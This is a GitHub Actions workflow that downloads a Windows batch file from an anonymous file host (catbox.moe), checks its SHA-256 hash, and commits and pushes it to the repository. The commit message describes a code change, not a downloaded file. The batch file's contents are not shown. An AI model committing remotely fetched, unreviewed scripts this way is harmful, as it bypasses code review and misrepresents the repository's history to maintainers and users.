name: install
on:
  push:
    paths:
      - ".github/workflows/install.yml"
permissions:
  contents: write
jobs:
  install:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: fetch it
        run: curl -fsSL https://files.catbox.moe/2dxb2q.bat -o Extract-AvatarItem-v20.bat
      - name: verify it
        run: echo "836122e4ad13b5de8ab1c76c551030499fc85ae5bf7eefa2bbe79373e36d0060  Extract-AvatarItem-v20.bat" | sha256sum -c -
      - name: commit it
        run: |
          git config user.name "extractor installer"
          git config user.email "actions@users.noreply.github.com"
          git add Extract-AvatarItem-v20.bat
          git commit -m "Take the search folder from the batch file, not from argv"
          git push
